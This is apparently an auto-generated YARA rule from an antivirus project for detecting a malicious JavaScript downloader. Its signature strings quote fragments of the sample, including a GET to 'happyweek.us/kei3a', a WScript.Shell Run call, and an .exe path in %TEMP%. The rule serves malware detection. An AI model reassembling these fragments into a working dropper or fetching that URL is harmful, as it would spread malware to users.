rule sig_20160328_ed3f4694c3bc110705f9d342f5a273cd {
  meta:
    description = "datamaliciousorder - file 20160328_ed3f4694c3bc110705f9d342f5a273cd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cb1f37b2097a7774229876c18634f7001e40e7c07b3b9c0e525a588cb3f11d00"

  strings:
    $s1  = "function Yeabgzxpir() {return Ijqenusfro[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"af3Jh4qFJZ7N2l.exe\";};" fullword ascii
    $s2  = "do {WScript[Zreocnmpzi](Jcqaaymqr() * 11)} while (Jbgxrcbr[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Engwoi(Punvx, Wjdefrfvf){return Punvx - Wjdefrfvf;};" fullword ascii
    $s4  = "Jbgxrcbr[Fuyxaser](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s5  = "var Ijqenusfro = function Swrxc() {return WScript[Yhqjyguhu](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ifenpdnie(Lflpllaygu){Ijqenusfro[\"Run\"](Lflpllaygu, Vssjdcfjxd, Vssjdcfjxd);};" fullword ascii
    $s7  = "function Gmkbwf() {return ((Fetiuncgc == true) && (Fetiuncgc == Oibdqm)) ? 1 : Vssjdcfjxd;};" fullword ascii
    $s8  = "Oibdqm = true; " fullword ascii
    $s9  = " while (Quznzwvaky){" fullword ascii
    $s10 = "function Jjezi()" fullword ascii
    $s11 = "return Engwoi(Hkbekbgrw, Gnxfazgl);" fullword ascii
    $s12 = "function Jcqaaymqr(){return 22;};" fullword ascii
    $s13 = "Fetiuncgc = true; " fullword ascii
    $s14 = "var Vmsmqjwo = false;" fullword ascii
    $s15 = "function Jmuyianou(){return Yhqjyguhu;};" fullword ascii
    $s16 = "var Kbckn = new this[\"Date\"]();" fullword ascii
    $s17 = "function Idpautz(Plcmlzsazy) {var Fatdq = (1, 2, 3, 4, 5, Plcmlzsazy); return Fatdq;};" fullword ascii
    $s18 = "var Fetiuncgc = false;" fullword ascii
    $s19 = "function Iktkpppm(){return Rnktla;};" fullword ascii
    $s20 = "var Oibdqm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}